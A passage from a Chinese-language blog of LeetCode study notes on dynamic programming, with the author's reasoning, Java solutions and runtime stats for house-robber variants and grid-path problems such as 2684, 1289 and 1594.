class="line">按照我个人的理解的话，我会将的dp数组定义为dp[j]表示打劫了第j家取得的最大收益</span><br><span class="line">于是有dp[k] = max(dp[k-2], dp[k-3]) + nums[k-1]</span><br><span class="line">然后结果为max(dp[N], dp[N-1])。</span><br><span class="line">但是我们看对应的题解，用的递推公式为:</span><br><span class="line">dp[k] = max(dp[k-1], nums[k-1] + dp[k-2]); 即k这个地方即可以偷，又可以不偷。分析下也可以知道确实可以这样设定，这也告诉了我不一定非要局限于某个数取不取的问题。子问题不一定不要完全不相交</span><br><span class="line"></span><br><span class="line">分析本题，肯定先对数组排序，然后还是相似做法。</span><br></pre></td></tr></table></figure>

<p>题解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">maximumTotalDamage</span><span class="params">(<span class="type">int</span>[] power)</span> &#123;</span><br><span class="line">    Arrays.sort(power);</span><br><span class="line">    <span class="type">long</span> <span class="variable">curCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//记录之前的结果和数</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">preRes1</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//dp[j-3]</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">preNum1</span> <span class="operator">=</span> -<span class="number">10</span>;</span><br><span class="line">    <span class="type">long</span> <span class="variable">preRes2</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//dp[j - 2]</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">preNum2</span> <span class="operator">=</span> -<span class="number">7</span>;</span><br><span class="line">    <span class="type">long</span> <span class="variable">preRes3</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> <span class="variable">preNum3</span> <span class="operator">=</span> -<span class="number">5</span>;<span class="comment">//dp[j - 1]</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">curVal</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; power.length - <span class="number">1</span>; i++)&#123;</span><br><span class="line">        curCount += power[i];</span><br><span class="line">        <span class="keyword">if</span>(power[i] != power[i + <span class="number">1</span>])&#123;</span><br><span class="line">            <span class="keyword">if</span>(power[i] - preNum3 &gt; <span class="number">2</span>)&#123;</span><br><span class="line">                curVal = preRes3 + curCount;</span><br><span class="line"></span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(power[i] - preNum3 == <span class="number">2</span>)&#123;</span><br><span class="line">                curVal = Long.max(preRes3, preRes2 + curCount);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(power[i] - preNum2 == <span class="number">2</span>)&#123;</span><br><span class="line">                    curVal = Long.max(preRes3, preRes1 + curCount);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    curVal = Long.max(preRes3, preRes2 + curCount);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">long</span> <span class="variable">tempRes</span> <span class="operator">=</span> preRes3;</span><br><span class="line">            <span class="type">long</span> <span class="variable">tempNum</span> <span class="operator">=</span> preNum3;</span><br><span class="line">            preRes3 = curVal;</span><br><span class="line">            preNum3 = power[i];</span><br><span class="line">            preNum1 = preNum2;</span><br><span class="line">            preRes1 = preRes2;</span><br><span class="line">            preNum2 = tempNum;</span><br><span class="line">            preRes2 = tempRes;</span><br><span class="line">            curCount = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> power.length - <span class="number">1</span>;</span><br><span class="line">    curCount += power[i];</span><br><span class="line">    <span class="keyword">if</span>(power[i] - preNum3 &gt; <span class="number">2</span>)&#123;</span><br><span class="line">        curVal = preRes3 + curCount;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(power[i] - preNum3 == <span class="number">2</span>)&#123;</span><br><span class="line">        curVal = Long.max(preRes3, preRes2 + curCount);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(power[i] - preNum2 == <span class="number">2</span>)&#123;</span><br><span class="line">            curVal = Long.max(preRes3, preRes1 + curCount);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            curVal = Long.max(preRes3, preRes2 + curCount);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> curVal;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用时96.66%</p>
<p>内存52.88%</p>
<p>题解代码学习</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">maximumTotalDamage</span><span class="params">(<span class="type">int</span>[] power)</span> &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; cnt = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> x : power) &#123;</span><br><span class="line">            cnt.merge(x, <span class="number">1</span>, Integer::sum);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> cnt.size();</span><br><span class="line">        <span class="type">int</span>[] a = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> x : cnt.keySet()) &#123;</span><br><span class="line">            a[k++] = x;</span><br><span class="line">        &#125;</span><br><span class="line">        Arrays.sort(a);</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span>[] f = <span class="keyword">new</span> <span class="title class_">long</span>[n + <span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> a[i];</span><br><span class="line">            <span class="keyword">while</span> (a[j] &lt; x - <span class="number">2</span>) &#123;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            f[i + <span class="number">1</span>] = Math.max(f[i], f[j] + (<span class="type">long</span>) x * cnt.get(x));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> f[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">作者：灵茶山艾府</span><br><span class="line">链接：https:<span class="comment">//leetcode.cn/problems/maximum-total-damage-with-spell-casting/solutions/2812389/tao-lu-da-jia-jie-she-pythonjavacgo-by-e-p9b5/</span></span><br><span class="line">来源：力扣（LeetCode）</span><br><span class="line">著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</span><br></pre></td></tr></table></figure>

<h3 id="2606-找到最大开销的子字符串"><a href="#2606-找到最大开销的子字符串" class="headerlink" title="2606. 找到最大开销的子字符串"></a><a href="https://leetcode.cn/problems/find-the-substring-with-maximum-cost/">2606. 找到最大开销的子字符串</a></h3><p>思路</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">最大子数组和变式</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximumCostSubstring</span><span class="params">(String s, String chars, <span class="type">int</span>[] vals)</span> &#123;</span><br><span class="line">    Map&lt;Character, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">26</span>; i++) &#123;</span><br><span class="line">        map.put((<span class="type">char</span>) (<span class="string">&#x27;a&#x27;</span> + i - <span class="number">1</span>), i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; chars.length(); i++) &#123;</span><br><span class="line">        map.put(chars.charAt(i), vals[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">prev</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">cur</span> <span class="operator">=</span> Integer.max(<span class="number">0</span>, prev) + map.get(s.charAt(i));</span><br><span class="line">        res = Integer.max(res, cur);</span><br><span class="line">        prev = cur;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单</p>
<h3 id="1749-任意子数组和的绝对值的最大值"><a href="#1749-任意子数组和的绝对值的最大值" class="headerlink" title="1749. 任意子数组和的绝对值的最大值"></a><a href="https://leetcode.cn/problems/maximum-absolute-sum-of-any-subarray/">1749. 任意子数组和的绝对值的最大值</a></h3><p>todo</p>
<h3 id="1191-K-次串联后最大子数组之和"><a href="#1191-K-次串联后最大子数组之和" class="headerlink" title="1191. K 次串联后最大子数组之和"></a><a href="https://leetcode.cn/problems/k-concatenation-maximum-sum/">1191. K 次串联后最大子数组之和</a></h3><p>todo</p>
<h3 id="2321-拼接数组的最大分数"><a href="#2321-拼接数组的最大分数" class="headerlink" title="2321. 拼接数组的最大分数"></a><a href="https://leetcode.cn/problems/maximum-score-of-spliced-array/">2321. 拼接数组的最大分数</a></h3><p>todo</p>
<h2 id="网格图dp"><a href="#网格图dp" class="headerlink" title="网格图dp"></a>网格图dp</h2><h3 id="LCR-166-珠宝的最高价值"><a href="#LCR-166-珠宝的最高价值" class="headerlink" title="LCR 166. 珠宝的最高价值"></a><a href="https://leetcode.cn/problems/li-wu-de-zui-da-jie-zhi-lcof/">LCR 166. 珠宝的最高价值</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">很简单的dp，dp[i][j] = max(dp[i-1][j], dp[i][j-1]) + frame[i][j]</span><br><span class="line">然后发现可以压缩下空间</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> frame.length;</span><br><span class="line"><span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> frame[<span class="number">0</span>].length;</span><br><span class="line"><span class="comment">//其实这里还能节约空间看n、m哪个小对应创建。不过一般还是横着遍历好点（操作系统知识）</span></span><br><span class="line"><span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">        dp[j + <span class="number">1</span>] = Integer.max(dp[j + <span class="number">1</span>], dp[j]) + frame[i][j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> dp[n];</span><br></pre></td></tr></table></figure>

<p>一分钟秒了嘻嘻</p>
<p>用时：89.97%</p>
<p>内存：59.35%</p>
<h3 id="2684-矩阵中移动的最大次数"><a href="#2684-矩阵中移动的最大次数" class="headerlink" title="2684. 矩阵中移动的最大次数"></a><a href="https://leetcode.cn/problems/maximum-number-of-moves-in-a-grid/">2684. 矩阵中移动的最大次数</a></h3><p>题干</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">给你一个下标从 0 开始、大小为 m x n 的矩阵 grid ，矩阵由若干 正 整数组成。</span><br><span class="line"></span><br><span class="line">你可以从矩阵第一列中的 任一 单元格出发，按以下方式遍历 grid ：</span><br><span class="line"></span><br><span class="line">从单元格 (row, col) 可以移动到 (row - 1, col + 1)、(row, col + 1) 和 (row + 1, col + 1) 三个单元格中任一满足值 严格 大于当前单元格的单元格。</span><br><span class="line">返回你在矩阵中能够 移动 的 最大 次数。</span><br></pre></td></tr></table></figure>

<p>也就是只能向右边走，且每次的格子都得比之前大</p>
<p>行为m，列为n。初始化dp[m+1]</p>
<p>然后按列遍历，即可</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxMoves</span><span class="params">(<span class="type">int</span>[][] grid)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> grid.length;</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> grid[<span class="number">0</span>].length;</span><br><span class="line">    <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[m][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            dp[i][j % <span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] &gt; grid[i][j - <span class="number">1</span>] &amp;&amp; dp[i][(j + <span class="number">1</span>) % <span class="number">2</span>] == (j - <span class="number">1</span>)) &#123;</span><br><span class="line">                    dp[i][j % <span class="number">2</span>] = j;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] &gt; grid[i + <span class="number">1</span>][j - <span class="number">1</span>] &amp;&amp; dp[i + <span class="number">1</span>][(j + <span class="number">1</span>) % <span class="number">2</span>] == (j - <span class="number">1</span>)) &#123;</span><br><span class="line">                    dp[i][j % <span class="number">2</span>] = j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i == m - <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] &gt; grid[i - <span class="number">1</span>][j - <span class="number">1</span>] &amp;&amp; dp[i - <span class="number">1</span>][(j + <span class="number">1</span>) % <span class="number">2</span>] == (j - <span class="number">1</span>)) &#123;</span><br><span class="line">                    dp[i][j % <span class="number">2</span>] = j;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] &gt; grid[i][j - <span class="number">1</span>] &amp;&amp; dp[i][(j + <span class="number">1</span>) % <span class="number">2</span>] == (j - <span class="number">1</span>)) &#123;</span><br><span class="line">                    dp[i][j % <span class="number">2</span>] = j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] &gt; grid[i - <span class="number">1</span>][j - <span class="number">1</span>] &amp;&amp; dp[i - <span class="number">1</span>][(j + <span class="number">1</span>) % <span class="number">2</span>] == (j - <span class="number">1</span>)) &#123;</span><br><span class="line">                    dp[i][j % <span class="number">2</span>] = j;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] &gt; grid[i][j - <span class="number">1</span>] &amp;&amp; dp[i][(j + <span class="number">1</span>) % <span class="number">2</span>] == (j - <span class="number">1</span>)) &#123;</span><br><span class="line">                    dp[i][j % <span class="number">2</span>] = j;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] &gt; grid[i + <span class="number">1</span>][j - <span class="number">1</span>] &amp;&amp; dp[i + <span class="number">1</span>][(j + <span class="number">1</span>) % <span class="number">2</span>] == (j - <span class="number">1</span>)) &#123;</span><br><span class="line">                    dp[i][j % <span class="number">2</span>] = j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            res = Integer.max(dp[i][j % <span class="number">2</span>], res);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用时13.02%</p>
<p>内存11.24%</p>
<p>其它思路</p>
<p>其实可以广搜，做dp做多了，竟然没想到</p>
<h3 id="2304-网格中的最小路径代价"><a href="#2304-网格中的最小路径代价" class="headerlink" title="2304. 网格中的最小路径代价"></a><a href="https://leetcode.cn/problems/minimum-path-cost-in-a-grid/">2304. 网格中的最小路径代价</a></h3><p>题干</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">给你一个下标从 0 开始的整数矩阵 grid ，矩阵大小为 m x n ，由从 0 到 m * n - 1 的不同整数组成。你可以在此矩阵中，从一个单元格移动到 下一行 的任何其他单元格。如果你位于单元格 (x, y) ，且满足 x &lt; m - 1 ，你可以移动到 (x + 1, 0), (x + 1, 1), ..., (x + 1, n - 1) 中的任何一个单元格。注意： 在最后一行中的单元格不能触发移动。</span><br><span class="line"></span><br><span class="line">每次可能的移动都需要付出对应的代价，代价用一个下标从 0 开始的二维数组 moveCost 表示，该数组大小为 (m * n) x n ，其中 moveCost[i][j] 是从值为 i 的单元格移动到下一行第 j 列单元格的代价。从 grid 最后一行的单元格移动的代价可以忽略。</span><br><span class="line"></span><br><span class="line">grid 一条路径的代价是：所有路径经过的单元格的 值之和 加上 所有移动的 代价之和 。从 第一行 任意单元格出发，返回到达 最后一行 任意单元格的最小路径代价。</span><br></pre></td></tr></table></figure>

<p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一眼网格dp，直接看代码吧（CV题解的）</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int minPathCost(int[][] grid, int[][] moveCost) &#123;</span><br><span class="line">        int m = grid.length, n = grid[0].length;</span><br><span class="line">        int[][] dp = new int[2][n];</span><br><span class="line">        dp[0] = grid[0].clone();</span><br><span class="line">        int cur = 0;</span><br><span class="line">        for (int i = 1; i &lt; m; i++) &#123;</span><br><span class="line">            int next = 1 - cur;</span><br><span class="line">            for (int j = 0; j &lt; n; j++) &#123;</span><br><span class="line">                dp[next][j] = Integer.MAX_VALUE;</span><br><span class="line">                for (int k = 0; k &lt; n; k++) &#123;</span><br><span class="line">                    dp[next][j] = Math.min(dp[next][j], dp[cur][k] + moveCost[grid[i - 1][k]][j] + grid[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            cur = next;</span><br><span class="line">        &#125;</span><br><span class="line">        return Arrays.stream(dp[cur]).min().getAsInt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1289-下降路径最小和-II"><a href="#1289-下降路径最小和-II" class="headerlink" title="1289. 下降路径最小和 II"></a><a href="https://leetcode.cn/problems/minimum-falling-path-sum-ii/">1289. 下降路径最小和 II</a></h3><p>题干</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">给你一个 n x n 整数矩阵 grid ，请你返回 非零偏移下降路径 数字和的最小值。</span><br><span class="line"></span><br><span class="line">非零偏移下降路径 定义为：从 grid 数组中的每一行选择一个数字，且按顺序选出来的数字中，相邻数字不在原数组的同一列。</span><br></pre></td></tr></table></figure>

<p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">困难题，有点害怕233</span><br><span class="line"></span><br><span class="line">应该还是网格题。不过多了限制按顺序选出来的数字中，相邻数字不在原数组的同一列</span><br><span class="line">感觉不像困难题啊，应该中等吧。动态规划+ o（n^3)看能通过不，不能那就是困难了</span><br><span class="line">中等难度 =&gt; 题解方法二应该是困难难度学下</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minFallingPathSum</span><span class="params">(<span class="type">int</span>[][] grid)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> grid.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> grid[<span class="number">0</span>].length;</span><br><span class="line">        <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>][n];</span><br><span class="line">        dp[<span class="number">0</span>] = grid[<span class="number">0</span>].clone();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">minVal</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>; k &lt; n; k++) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(k == j) <span class="keyword">continue</span>;</span><br><span class="line">                    minVal = Integer.min(dp[(i-<span class="number">1</span>)%<span class="number">2</span>][k], minVal);</span><br><span class="line">                &#125;</span><br><span class="line">                dp[i%<span class="number">2</span>][j] = grid[i][j] + minVal;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Arrays.stream(dp[(n-<span class="number">1</span>)%<span class="number">2</span>]).min().getAsInt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>顺便学了下stream用法：</p>
<p><a href="https://blog.csdn.net/m0_55990500/article/details/125162981">JDK1.8 Arrays.Stream()用法和介绍-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/qq_43410878/article/details/123716629">【java基础】吐血总结Stream流操作_java stream流操作-CSDN博客</a></p>
<p>题解学习</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">idea：因为我们需要获取上行的最小值，但是又不能跟本列相同。因此可以记录两个最小值及最小值的纵坐标。</span><br><span class="line">下一行计算时先判断纵坐标是否相同</span><br><span class="line">相同就用第二小值</span><br><span class="line">不同就用最小值</span><br></pre></td></tr></table></figure>

<h3 id="1594-矩阵的最大非负积"><a href="#1594-矩阵的最大非负积" class="headerlink" title="1594. 矩阵的最大非负积"></a><a href="https://leetcode.cn/problems/maximum-non-negative-product-in-a-matrix/">1594. 矩阵的最大非负积</a></h3><p>题干</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">给你一个大小为 m x n 的矩阵 grid 。最初，你位于左上角 (0, 0) ，每一步，你可以在矩阵中 向右 或 向下 移动。</span><br><span class="line"></span><br><span class="line">在从左上角 (0, 0) 开始到右下角 (m - 1, n - 1) 结束的所有路径中，找出具有 最大非负积 的路径。路径的积是沿路径访问的单元格中所有整数的乘积。</span><br><span class="line"></span><br><span class="line">返回 最大非负积 对 109 + 7 取余 的结果。如果最大积为 负数 ，则返回 -1 。</span><br><span class="line"></span><br><span class="line">注意，取余是在得到最大积之后执行的。</span><br></pre></td></tr></table></figure>

<p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">网格题，很简单，因为不知道是正还是负数。并且最大正数可能是由负数乘负数得到的因此，因此两种状态都要存。</span><br><span class="line">之后就是常见dp了，不过需要注意数据范围，直接开long就行</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxProductPath</span><span class="params">(<span class="type">int</span>[][] grid)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> grid.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> grid[<span class="number">0</span>].length;</span><br><span class="line">        <span class="comment">//假如只有正数 dp[i][j]= grid[i][j]*max(dp[i-1][j],dp[i][j-1])</span></span><br><span class="line">        <span class="type">long</span>[][] dp = <span class="keyword">new</span> <span class="title class_">long</span>[<span class="number">2</span>][n];</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = dp[<span class="number">1</span>][<span class="number">0</span>] = grid[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            dp[<span class="number">0</span>][i] = dp[<span class="number">1</span>][i] = (<span class="type">long</span>) grid[<span class="number">0</span>][i] * dp[<span class="number">0</span>][i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">res1</span> <span class="operator">=</span> dp[<span class="number">0</span>][j] * grid[i][j];</span><br><span class="line">                <span class="type">long</span> <span class="variable">res2</span> <span class="operator">=</span> dp[<span class="number">1</span>][j] * grid[i][j];</span><br><span class="line">                <span class="keyword">if</span> (j &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="type">long</span> <span class="variable">res3</span> <span class="operator">=</span> dp[<span class="number">0</span>][j - <span class="number">1</span>] * grid[i][j];</span><br><span class="line">                    <span class="type">long</span> <span class="variable">res4</span> <span class="operator">=</span> dp[<span class="number">1</span>][j - <span class="number">1</span>] * grid[i][j];</span><br><span class="line">                    dp[<span class="number">0</span>][j] = Long.max(Long.max(res1, res2), Long.max(res3, res4));</span><br><span class="line">                    dp[<span class="number">1</span>][j] = Long.min(Long.min(res1, res2), Long.min(res3, res4));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    dp[<span class="number">0</span>][j] = Long.max(res1, res2);</span><br><span class="line">                    dp[<span class="number">1</span>][j] = Long.min(res1, res2);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (dp[<span class="number">0</span>][n - <span class="number">1</span>] &lt; <span class="number">0</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">int</span>) (dp[<span class="number">0</span>][n - <span class="number">1</span>] % (<span class="number">1000000000</span> + <span class="number">7</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用时:100%</p>
<p>内存:99.07%</p>
<p>md，看起来简单的题，调了半天</p>
<h3 id="1301-最大得分的路径数目"><a href="#1301-最大得分的路径数目" class="headerlink" title="1301. 最大得分的路径数目"></a><a href="https://leetcode.cn/problems/number-of-paths-with-max-score/">1301. 最大得分的路径数目</a></h3><p>题干</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">给你一个正方形字符数组 board ，你从数组最右下方的字符 &#x27;S&#x27; 出发。</span><br><span class="line"></span><br><span class="line">你的目标是到达数组最左上角的字符 &#x27;E&#x27; ，数组剩余的部分为数字字符 1, 2, ..., 9 或者障碍 &#x27;X&#x27;。在每一步移动中，你可以向上、向左或者左上方移动，可以移动的前提是到达的格子没有障碍。</span><br><span class="line"></span><br><span class="line">一条路径的 「得分」 定义为：路径上所有数字的和。</span><br><span class="line"></span><br><span class="line">请你返回一个列表，包含两个整数：第一个整数是 「得分」 的最大值，第二个整数是得到最大得分的方案数，请把结果对 10^9 + 7 取余。</span><br><span class="line"></span><br><span class="line">如果没有任何路径可以到达终点，请返回 [0, 0] 。</span><br></pre></td></tr></table></figure>

<p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">常规网格题，但是多了个东西方案。</span><br><span class="line">从右下角到左上角跟，从左上角到右下角意思一样。</span><br><span class="line">dp[i][j] = max(dp[i-1][j],dp[i][j-1],dp[i-1][j-1])</span><br><span class="line">发现加一个变量可以空间压缩，开写代码</span><br></pre></td></tr></table></figure>

<p>代码</p>
